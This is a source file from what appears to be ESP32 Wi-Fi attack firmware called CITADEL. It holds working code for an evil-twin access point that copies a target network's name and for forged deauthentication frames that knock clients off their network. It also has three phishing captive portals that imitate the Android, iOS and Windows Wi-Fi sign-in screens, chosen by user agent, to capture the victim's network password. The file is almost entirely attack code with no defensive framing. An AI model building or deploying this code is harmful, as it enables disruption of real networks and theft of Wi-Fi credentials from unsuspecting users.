// ==========================================================
//   CITADEL v2.0.0 — CIT_V_2_0_0
//   File 03: Attacks — Evil Twin, Deauth, Beacon, Portals
// ==========================================================

void startEvilTwin(String ssid) {
  evilTwinSSID   = ssid;
  evilTwinActive = true;
  capturedCreds  = "";
  captureCount   = 0;
  WiFi.softAP(ssid.c_str(), NULL);
  addAttackLog("EVIL TWIN START: " + ssid);
}

void stopEvilTwin() {
  evilTwinActive = false;
  WiFi.softAP(apName.c_str(), apPass.c_str());
  addAttackLog("EVIL TWIN STOP. AP restored: " + apName);
}

void sendDeauth(uint8_t* bssid, uint8_t* client) {
  esp_wifi_set_promiscuous(true);
  memcpy(&deauthFrame[10], bssid,  6);
  memcpy(&deauthFrame[16], bssid,  6);
  memcpy(&deauthFrame[4],  client, 6);
  esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
  memcpy(&deauthFrame[4], bssid, 6);
  esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
  esp_wifi_set_promiscuous(false);
}

String buildCaptivePortalAndroid() {
  return "<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Sign in to Wi-Fi</title>"
    "<style>*{box-sizing:border-box;margin:0;padding:0}"
    "body{background:#fafafa;font-family:Roboto,Arial,sans-serif;"
    "display:flex;align-items:center;justify-content:center;min-height:100vh;}"
    ".card{background:#fff;border-radius:8px;padding:24px;width:340px;"
    "box-shadow:0 1px 3px rgba(0,0,0,0.2);}"
    "h2{font-size:16px;font-weight:500;color:#202124;margin-bottom:8px;}"
    "p{font-size:13px;color:#5f6368;margin-bottom:20px;}"
    "input{width:100%;border:1px solid #dadce0;border-radius:4px;"
    "padding:13px;font-size:14px;margin-bottom:16px;outline:none;}"
    "input:focus{border-color:#1a73e8;}"
    ".btn{width:100%;background:#1a73e8;color:#fff;border:none;"
    "border-radius:4px;padding:13px;font-size:14px;cursor:pointer;}"
    "</style></head><body><div class='card'>"
    "<h2>Sign in to " + evilTwinSSID + "</h2>"
    "<p>Enter the password for this network to connect.</p>"
    "<form method='POST' action='/captive'>"
    "<input type='password' name='p' placeholder='Password' autofocus>"
    "<button class='btn' type='submit'>Connect</button>"
    "</form></div></body></html>";
}

String buildCaptivePortalIOS() {
  return "<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>" + evilTwinSSID + "</title>"
    "<style>*{box-sizing:border-box;margin:0;padding:0}"
    "body{background:#f2f2f7;font-family:-apple-system,'SF Pro Text',sans-serif;}"
    ".hdr{background:#f2f2f7;padding:16px;text-align:center;border-bottom:1px solid #c6c6c8;}"
    ".hdr h1{font-size:17px;font-weight:600;}"
    ".hdr p{font-size:13px;color:#8e8e93;margin-top:4px;}"
    ".sec{background:#fff;margin:20px 16px;border-radius:10px;overflow:hidden;}"
    ".field{padding:12px 16px;}"
    ".field label{font-size:13px;color:#8e8e93;display:block;margin-bottom:4px;}"
    ".field input{width:100%;border:none;outline:none;font-size:17px;}"
    ".btn{display:block;width:calc(100% - 32px);margin:0 16px 20px;"
    "background:#007aff;color:#fff;border:none;border-radius:10px;"
    "padding:14px;font-size:17px;font-weight:600;cursor:pointer;}"
    "</style></head><body>"
    "<div class='hdr'><h1>" + evilTwinSSID + "</h1>"
    "<p>Enter the password for &#8220;" + evilTwinSSID + "&#8221;</p></div>"
    "<form method='POST' action='/captive'>"
    "<div class='sec'><div class='field'>"
    "<label>Password</label>"
    "<input type='password' name='p' placeholder='Required' autofocus>"
    "</div></div>"
    "<button class='btn' type='submit'>Join</button>"
    "</form></body></html>";
}

String buildCaptivePortalWindows() {
  return "<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Network sign-in</title>"
    "<style>*{box-sizing:border-box;margin:0;padding:0}"
    "body{background:#0078d4;font-family:'Segoe UI',sans-serif;"
    "display:flex;align-items:center;justify-content:center;min-height:100vh;}"
    ".box{background:#fff;width:360px;padding:32px;}"
    "h1{font-size:20px;font-weight:600;margin-bottom:8px;}"
    "p{font-size:13px;color:#605e5c;margin-bottom:24px;}"
    "label{font-size:12px;color:#323130;display:block;margin-bottom:4px;}"
    "input{width:100%;border:1px solid #8a8886;padding:8px;font-size:14px;"
    "margin-bottom:20px;outline:none;}"
    "input:focus{border-color:#0078d4;}"
    ".btn{background:#0078d4;color:#fff;border:none;padding:8px 20px;"
    "font-size:14px;cursor:pointer;}"
    "</style></head><body><div class='box'>"
    "<h1>Connect to " + evilTwinSSID + "</h1>"
    "<p>Enter the network security key to connect.</p>"
    "<form method='POST' action='/captive'>"
    "<label>Network security key</label>"
    "<input type='password' name='p' autofocus>"
    "<button class='btn' type='submit'>Next</button>"
    "</form></div></body></html>";
}

String buildCaptivePortal(String userAgent) {
  String ua = userAgent; ua.toLowerCase();
  if (captiveTheme == "ios"     || ua.indexOf("iphone") >= 0 || ua.indexOf("ipad") >= 0)
    return buildCaptivePortalIOS();
  if (captiveTheme == "windows" || ua.indexOf("windows") >= 0)
    return buildCaptivePortalWindows();
  return buildCaptivePortalAndroid();
}
